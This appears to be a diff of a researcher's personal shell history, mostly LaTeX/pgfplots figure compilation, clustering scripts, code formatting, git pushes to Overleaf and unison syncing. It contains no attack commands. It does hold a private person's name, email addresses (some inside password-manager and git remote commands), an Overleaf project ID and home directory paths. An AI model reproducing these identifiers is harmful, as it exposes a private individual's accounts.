+t1 = time.time()-t0
+./fcmeans -x X.csv
+./fcmeans -h
+Rio
+skll
+sudo apt install skll
+run_command
+echo "rrd" > /dev/stdout
+echo "rrd" > /dev/stdin
+pip install datamasH
+pip install csvkit
+pip install skll
+mkdir g
+cd g
+echo $PYTHONSTARTUP
+man python
+python -e $PYTHONSTARTUP
+man python | grep script
+python -c $PYTHONSTARTUP
+python
+bpython3
+cat U.csv
+python ./fcmeans
+grep -ri arg
+grep -ri argma
+gedit $PYTHONSTARTUP
+fcmeans -m 1.3
+fcmeans -m 3
+fcmeans -m 2 -p
+fcmeans -m 1.2
+fcmeans -m 2 -p True
+grep -ri algori
+gedit 8-comparison.py
+fcmeans -m 2
+fcmeans -g True
+fcmeans -c 4
+fcmeans -c 4 -g True
+fcmeans -f fcm
+fcmeans -f FCM -g True
+./distributions.r -o jh
+./distributions.r -h
+./distributions.r -x df
+./distributions.r
+./distributions.r -x fd
+head calc_cent.csv
+cat calc_cent.csv
+rstudio .
+R
+distributions
+rstudio
+fcmeans
+fcmeans -h
+mkdir bin
+fcmeans -f FCM
+grep -ri reft
+gedit commands.tex
+tex
+tex4ebook
+texcount
+r
+t
+mlpack_hmm_train -h
+mlpack_det -h
+mlpack_cf -h
+mlpack_test
+ls /home/aghiles/
+format-c */*
+format-c */*/*
+format-c */*/*/*
+format-c */*/*/*/*
+format-c */*/*/*/*/*
+format-c */*/*/*/*/*/*
+format-c */*/*/*/*/*/*/*
+format-c *.hpp
+format-c */*.hpp
+format-c */*/*.hpp
+format-c */*/*/*.hpp
+format-c */*/*/*/*.hpp
+format-c */*/*/*/*/*.hpp
+format-c */*/*/*/*/*/*.hpp
+format-c */*/*/*/*/*/*.cpp
+format-c */*/*/*/*/*.cpp
+format-cpp
+format-c */*/*.cpp
+format-c */*/*/*.cpp
+format-c */*/*/*/*.cpp
+ls $LANGUAGETOOLPATH
+rename -f 'y/A-Z/a-z/' *
+rename -f 'y/A-Z/a-z/' */*.ino
+c nvim
+nvim ecriture
+grep -i spell
+grep -i spell *
+gedit se
+gedit set.vim
+nvim
+grep -ri filename
+txt
+nvim ecriture.txt
+pass aghiles.djoudi@univ-paris-est.fr
+paste -d',\
+
+paste -d',' A.csv L.csv > 0A.csv
+cat 0A.csv
+echo "\
+\input{tikz}\
+\begin{document}\
+\begin{tikzpicture}\
+\begin{axis}[legend pos=north east,ylabel=BER, xlabel=\$RSSI_{[dbm]}$, ticklabel style = {font=\scriptsize}, label style={font=\scriptsize}, legend style={font=\scriptsize}]\
+\addplot[scatter/classes={1={green}, 0={blue}, 2={red}},scatter src=explicit symbolic, only marks,scatter,mark=*,mark size=0.5, mark color=blue] table[y=BER,x=RSSI,meta=L] {A.csv};\
+\legend{Cluster 0,Cluster 1, Cluster 2}\
+\end{axis}\
+\end{tikzpicture}\
+\end{document}\
+"
+echo "\
+\\input{tikz}\
+\\begin{document}\
+\\begin{tikzpicture}\
+\\begin{axis}[legend pos=north east,ylabel=BER, xlabel=\$RSSI_{[dbm]}$, ticklabel style = {font=\scriptsize}, label style={font=\scriptsize}, legend style={font=\scriptsize}]\
+\\addplot[scatter/classes={1={green}, 0={blue}, 2={red}},scatter src=explicit symbolic, only marks,scatter,mark=*,mark size=0.5, mark color=blue] table[y=BER,x=RSSI,meta=L] {A.csv};\
+\\legend{Cluster 0,Cluster 1, Cluster 2}\
+\\end{axis}\
+\\end{tikzpicture}\
+\\end{document}\
+"
+echo "\
+\\\input{tikz}\
+\\\begin{document}\
+\\\begin{tikzpicture}\
+\\\begin{axis}[legend pos=north east,ylabel=BER, xlabel=\$RSSI_{[dbm]}$, ticklabel style = {font=\scriptsize}, label style={font=\scriptsize}, legend style={font=\scriptsize}]\
+\\\addplot[scatter/classes={1={green}, 0={blue}, 2={red}},scatter src=explicit symbolic, only marks,scatter,mark=*,mark size=0.5, mark color=blue] table[y=BER,x=RSSI,meta=L] {A.csv};\
+\\\legend{Cluster 0,Cluster 1, Cluster 2}\
+\\\end{axis}\
+\\\end{tikzpicture}\
+\\\end{document}\
+"
+latexmk -f -cd -pvc -jobname=test "\begin{document} \end{document}}
+latexmk -f -cd -pvc -jobname=test "\begin{document} \end{document}}"
+latexmk -jobname=test "\begin{document} \end{document}}"
+lualatex -jobname=test "\begin{document} \end{document}}"
+latex "\begin{document} \end{document}}"
+latex "\documentclass{standalone} \begin{document} \end{document}}"
+pdflatex "\documentclass{standalone} \begin{document} aaaaaaaa \end{document}}"
+latexmk "\documentclass{standalone} \begin{document} aaaaaaaa \end{document}}"
+latex "\documentclass{standalone} \begin{document} aaaaaaaa \end{document}}"
+latex "\input{tikz} \begin{document} aaaaaaaa \end{document}}"
+lulatex "\input{tikz} \begin{document} aaaaaaaa \end{document}}"
+lualatex "\input{tikz} \begin{document} aaaaaaaa \end{document}}"
+lualatex "\
+\input{tikz}\
+\begin{document}\
+\begin{tikzpicture}\
+\begin{axis}[legend pos=north east,ylabel=BER, xlabel=\$RSSI_{[dbm]}$, ticklabel style = {font=\scriptsize}, label style={font=\scriptsize}, legend style={font=\scriptsize}]\
+\addplot[scatter/classes={1={green}, 0={blue}, 2={red}},scatter src=explicit symbolic, only marks,scatter,mark=*,mark size=0.5, mark color=blue] table[y=BER,x=RSSI,meta=L] {A.csv};\
+\legend{Cluster 0,Cluster 1, Cluster 2}\
+\end{axis}\
+\end{tikzpicture}\
+\end{document}\
+"
+evince test.pdf
+compile-tikz BER RSSI L A.csv
+compile-tikz SF RSSI L A.csv
+compile-tikz PS RSSI L A.csv
+compile-tikz SF U1 L A.csv
+compile-tikz SF U2 L A.csv
+bluetoothctl
+grep -ri latexmk
+lualatex -outdir=.bin -auxdir=.bin -pvc -jobname=test "\\
+\begin{document}\\
+\end{document}\\
+"
+latemk -h
+lualatex -h
+nvim mail
+latex -h
+man latex$
+man latex
+lualatex -outdir=.bin -auxdir=.bin -pvc -jobname=test "\\
+\input{tikz}\\
+\begin{document}\\
+\end{document}\\
+"
+lualatex -silent -outdir=.bin -auxdir=.bin -pvc -jobname=test "\\
+\input{tikz}\\
+\begin{document}\\
+\end{document}\\
+"
+man latexma
+man latexmk
+grep -ri delete
+grep -i delete *
+grep -i purge *
+grep -ri purge
+gedit test.tex
+latexmk -h | grep file
+latexmk -h
+gedit ~/.config/latexmk/latexmkrc
+latexmk
+latexmk -r .
+touch jh
+latexmk -r jh
+compile-tikz PS RSSI L A0.csv
+man lulatex
+man lualatex
+compile-tikz RSSI RSSI L A0.csv ed
+tikz
+tick
+pgf
+gedit
+grep -ri node
+whereis texlive
+grep -ri tick
+grep -ri label
+grep -ri zaxis
+grep -ri xaxis
+grep -ri x-axis
+echo TEXINPUTS
+echo $TEXINPUTS
+tlmgrd
+tlmgr
+man tlmg
+echo $BIBINPUTS
+echo $TEXMFHOME
+echo $TEXMFLOCAl
+echo $TEXMFROOT
+grep -ri xlabel
+find . -iname '*.tex' -print0 | xargs -0 perl -lane 'if (m<\\begin\{(?:style)?key}\{/([^=}(]*)=>){print "$1"}' | sort
+grep -ri addplot
+gedit lua/pgfplots/pgfplotstexio.lua
+grep -ri option
+grep -ri options
+grep -ri def/xtick
+grep -ri def\\xtick
+grep -ri def\\ 
+grep -ri def\
+: 1580944885:0;grep -ri def\\ 
+grep -ri \\xtick
+grep -ri \\\xtick
+grep -ri xtick
+pgf2pdf
+grep -ri \def\pgfplots@x
+grep -ri \\def\\pgfplots@x
+grep -ri "\\def\\pgfplots@x"
+grep -ri "\def\pgfplots@x"
+grep -ri ".def.pgfplots@x"
+grep -ri ifpgfplots@
+grep -ri \newif\ifpgfplots@a
+grep -ri newif.ifpgfplots@a
+grep -ri newif.ifpgfplots@
+grep -ri "\pgfplots@"
+grep -ri "\\pgfplots@"
+grep -ri "pgfplots@"
+grep -ri "let\\pgfplots@"
+grep -ri "let\\\pgfplots@"
+grep -ri "def\\\pgfplots@"
+grep -ri "xticklabel"
+grep -ri "/pgfplots/"
+grep -ri legend@
+cd pgfplots
+grep -ri legend pos
+grep -ri legend@pos
+grep -ri legend
+grep -ri legend.pos
+grep -ri legend options:
+grep -ri legend options
+grep -ri "legend pos"
+grep -ri "legend options"
+grep -ri "legend pos"\
+p
+grep -ri "options"
+grep -ri "options:"
+grep -i "/pgfplots/" pgfplots.code.tex
+grep -i "pgfplots" pgfplots.code.tex
+grep -i "pgfplots@" pgfplots.code.tex
+grep -i "addplot" pgfplots.code.tex
+grep -ri "catterddplot"
+grep -ri "scatter"
+grep -i "scatter/cl" pgfplots.code.tex
+grep -ri "scatter/cl"
+grep -i "pgfplots/" pgfplots.code.tex
+grep -i "pgfplots/" pgfplots.code.tex > 0
+grep -i "pgfplots/" pgfplots.code.tex > ~/0
+grep -i "pgfkeys"
+grep -ri "pgfkeys"
+grep -ri "addplot"
+gedit 0.tex
+grep -ri "\\\def\pgfplots@"
+grep -ri "\\\def\\\pgfplots@"
+grep -ri "\\\def\\\pgfplots@" > 1.tex
+grep -ri "\\\def\\\pgfplots@" > ~/1.tex
+grep -ri "every axis"
+grep -ric "pgfplots"
+grep -ri "pgfplots"
+grep -rif "pgfplots"
+grep -rin "pgfplots"
+bright
+grep -ri tikz
+grep -ri tickz.ticklabel
+nautilus .
+grep -ri scater
+grep -ri scatter
+grep -ri axi
+grep -ri axis
+<q
+grep -ri "\\tikz"
+grep -ri "\\\tikz"
+grep -ri "/tikz"
+grep -ri "/tikz/xtick"
+grep -ri "/tikz/tick"
+grep -ri "/tikz/xlabel"
+grep -ri "\\\tikz@xlabel"
+grep -ri xticklabel
+gedit generic/pgfplots/pgfplots.code.tex
+setings
+cd generic/pgfplots/
+gedit pgfplotsplothandlers.code.tex
+grep -ri "\n\t/pgfplots/"
+grep -rzi "\n\t/pgfplots/"
+grep -rEi "\n\t/pgfplots/"
+egrep -ri "\n\t/pgfplots/"
+egrep -ri "/pgfplots/"
+egrep -ri "\t/pgfplots/"
+egrep -ri "\\t/pgfplots/"
+egrep -ri '\\t/pgfplots/'
+grep -ri '\\t/pgfplots/'
+grep -ri '\t/pgfplots/'
+grep -ri '\n.*/pgfplots/'
+grep -ri '/pgfplots/'
+grep '/pgfplots/' pgfplots.code.tex
+grep '.*/pgfplots/' pgfplots.code.tex
+grep '\n.*/pgfplots/' pgfplots.code.tex
+grep '\n\t+/pgfplots/' pgfplots.code.tex
+grep '\n\t*/pgfplots/' pgfplots.code.tex
+ps -A
+gedit pgfplots.code.tex&
+pkill gedit
+gedit pgfplots.code.tex &
+gedit pgfplots.code.tex
+grep -ri "\n	/pgfplots"
+grep -rzi "\n	/pgfplots"
+grep -rzi "\\n	/pgfplots"
+grep -rzi "	/pgfplots"
+grep -ri "	/pgfplots"
+grep -ri "^	/pgfplots"
+grep -ri "^	/pgfplots" > ~/AA.tex
+ls /home/aghiles/Aghiles/job/plt
+ls /home/aghiles/Aghiles/job/cod/plt
+mu
+pass edit aghilesdjoudi@gmail.com
+gedit AA.tex
+hdmi-right
+grep -ri gnu
+hdmi-off
+format-c */*.ino
+grep -ri rnd
+compile-tikz SNR RSSI L A0.csv ed
+compile-tikz SF RSSI L A0.csv ed
+compile-tikz PS RSSI L A0.csv ed
+compile-tikz PS BER L A0.csv ed
+compile-tikz SNR ToA L A0.csv ed
+grep -ri meta
+texdoc tikz
+gedit axis.tex
+gedit axis.tex &
+cd r
+gedit every.tex
+gedit every.tex &
+git push
+git
+git remote add overleaf https://git.overleaf.com/5e15f6d388f67a0001194cf2
+push
+compile-tikz PS ToA L A0.csv ed
+compile-tikz SF ToA L A0.csv ed
+compile-tikz BW RSSI L A0.csv ed
+compile-tikz BW ToA L A0.csv ed
+git remote add overleaf https://git.overleaf.com/5e15f6d388f67a0001194cf2.git
+ls -A
+commit
+gedit commit
+ls -a
+git commit 0*
+git push -u origine master
+git push origine master
+git add 0*
+git commit
+cd
+man rsync
+man rsync | grep -z
+man rsync | grep \-z
+sittings
+sudo apt-get install unison
+man unison
+mkdir 1
+mkdir 2
+mkdir 2/test
+union
+installx union
+unison lora hg
+unison lora pi@192.168.200.1:aghilesg
+unison -h | grep host
+unison lora -host pi@192.168.200.1:aghilesg
+unison -host lora pi@192.168.200.1:aghilesg
+unison lora gf -host pi@192.168.200.1
+installx rslsync
+aghiles
+aghiles -h
+freeplane
+cd a
+mkdir touch 1/AA
+touch 1/AA
+touch 1/AAj
+ls 1
+unison 1 2
+unison 2 1
+unison -h
+unison -h | grep mirr
+unison -h | grep irr
+mirror
+installx mirror
+ls ..
+cd lora
+cd cli
+./push
+format-c *
+format-c */*.cpp
+format-c */*.h
+format-c *.cpp
+format-c *.h
+format-python */*/*/*/*.py
+sed -Ezi 's/#.*//g' *.py
+cat post_processing_gw.py
+sed -Ei 's/#.*//g' *.py
+touch tets
+gedit tets
+sed -Ei 's/[^\"]*#.*//g' tets
+sed -Ei 's/[^\"]+#.*//g' tets
+sed -Ei 's/^[^\"]*#.*//g' tets
+sed -Ei 's/(^[^\"]*)#.*/\1/g' tets
+format-python *.py
+format-python */*.py
+format-python */*/*.py
+format-python */*/*/*.py
+python2 post_processing_gw.py
+grep -ri ttn_st
+grep -ri clouds_pars
+grep -ri ttn_stats
+grep -ri post_status
+format-c
+format-c *.c
+grep -ri chirp
+grep -ri stack
+texlua
+lua
+cp 5e15f6d388f67a0001194cf2 ../mll
+cd ..
+overleaf="https://aghilesdjoudi@gmail.com@git.overleaf.com/5e15f6d388f67a0001194cf2"
+git remote add overleaf $overleaf
+overleaf="https://aghilesdjoudi@gmail.com@git.overleaf.com/5e15f6d388f67a0001194cf2.git"
+overleaf="https://aghilesdjoudi@gmail.com@git.overleaf.com"
+git remote show origin
+git remote show cod
+overleaf="https://git.overleaf.com/5e15f6d388f67a0001194cf2"
+overleaf="https://aghilesdjoudi@gmail.comgit.overleaf.com/5e15f6d388f67a0001194cf2"
+overleaf="https://aghilesdjoudi\@gmail.comgit.overleaf.com/5e15f6d388f67a0001194cf2"
+git remote set-url overleaf $overleaf
+git push overleaf master
+git push origin master
+git commit -m "commit"
+git checkout
+git pull
+git commit https://git.overleaf.com/5e15f6d388f67a0001194cf2
+git clone https://git.overleaf.com/5e15f6d388f67a0001194cf2
+cd 5e15f6d388f67a0001194cf2
+pass show
+pass insert eos.ffss.fr/adjoudi
+gedit plot &
+compile-tikz
+compile-tikz r
+compile-tikz rj
+grep -ri pie
+settings
+compile-tikz ed PS ToA L A0.csv
+tlmgr init-usertree
+tlmgr install pgf-pie
+compile-tikz zed PS ToA L A0.csv
+plot
+plot -h
+plot-scatter h
+plot-scatter zed PS ToA L A0.csv
+rename 'y/A-Z/a-z/' *
+c qutebrowser
+qutebrowser
+plot-pie h
+gedit plot-bar
+plot-bar
+plot-bar e
+plot-pie
+plot-pie ff
+ms
+ls
+q
+fc-list :lang=fr
+fc-list :lang=ar
+pacsearch ttf-font
+echo $METAFONT
+ranger
+audio
+airpods
+rm ./.bin/slide*
+c latex
+q
+: 1581185396:0;push
+: 1581185536:0;push
+: 1581185586:0;push
